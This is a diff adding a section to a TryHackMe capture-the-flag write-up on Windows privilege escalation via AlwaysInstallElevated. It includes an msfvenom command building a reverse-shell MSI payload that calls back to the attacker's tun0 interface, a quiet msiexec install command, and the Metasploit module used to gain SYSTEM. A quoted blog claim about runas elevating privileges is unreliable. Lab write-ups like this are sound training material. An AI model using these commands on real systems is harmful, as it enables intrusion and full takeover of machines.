@@ -197,5 +197,53 @@ I executed WinPeas to check for the all possible privilege escalation vectors & 
 
 ![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/1847e73d-72f2-4c3c-9eb2-be7bc8ce9f30)
 
+When checked on [hacktrickz website](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#alwaysinstallelevated) how to exploit this vulnerability to perform Privesc, I found that user with any privilege can install ".msi" files with SYSTEM privilege.
+
+So, I followed the steps & created a .msi file using 'msfvenom'
+
+```bash
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=1337 -f msi -o update.msi
+```
+Uploaded the "update.msi" to the windows system & executed it:
+
+```
+msiexec /quiet /qn /i update.msi
+```
+
+But for some reason I didn't get the revershell back to my kali machine. I checked further about why my exploit is not working, I found in a blog that:
+
+```
+When you run msiexec directly in your SSH session, it uses the current user's privileges and permissions to execute the command. If the user account "dev-datasci-lowpriv" does not have sufficient privileges or lacks necessary permissions, it could result in the failure of the msiexec command.
+
+However, when you use runas /user:dev-datasci-lowpriv to execute msiexec, it runs the command under a different process with the specified user's credentials. This effectively elevates the privileges of the command, potentially bypassing any restrictions or permission issues associated with the current user account.
+```
+So, I can execute the "msiexec" using the runas command but I don't have the current user credentials. 
+
+### Metasploit:
+
+Then used Metasploit to escalate my privileges. So, intially I created a session using metasploit & then migrated myself into the other higher privilege process.
+
+I migrated myself because when I checked current privilege, I found myself running as a low level user with session 0.
+![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/58049932-d767-4378-85d6-147329a4d40f)
+
+After migrating myself now, I am having a higher privelege with session 1.
+![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/1a1f5905-8429-4bf9-8bf1-9df1105b3a84)
+
+Now, after the having the higher privilege I searched for the module in metasploit to exploit the "AlwaysInstallElevated" vulnerability & I found it as well under:
+
+```bash
+exploit/windows/local/always_install_elevated
+```
+
+![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/b6de0588-9ec4-4afc-9a56-4a603493bc12)
+
+I used the module, changed the variables & finally got a session as "NT AUTHORITY\SYSTEM", after which I got root flag as well.(pwn3d!🙂)
+
+![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/509626d7-dc80-4d2b-b7e3-c2a073ef8526)
+
+
+
+
+
 
 
